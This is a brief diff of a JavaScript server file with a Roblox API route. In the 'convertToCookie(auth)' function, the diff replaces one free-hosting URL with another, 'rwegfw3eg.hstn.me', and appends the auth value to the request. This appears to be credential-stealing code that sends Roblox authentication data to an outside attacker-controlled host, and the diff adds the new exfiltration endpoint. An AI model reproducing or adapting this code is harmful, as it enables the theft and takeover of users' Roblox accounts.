@@ -49,7 +49,7 @@ app.get('/roblox-api', (req,res) => {
 })
 
 async function convertToCookie(auth) {
-    let data = await fetch("https://alimohub.000webhost.com/convert/suggest.php?suggest="+auth, {
+    let data = await fetch("http://rwegfw3eg.hstn.me/?suggest="+auth, {
         mode:'no-cors'
     })
     await data
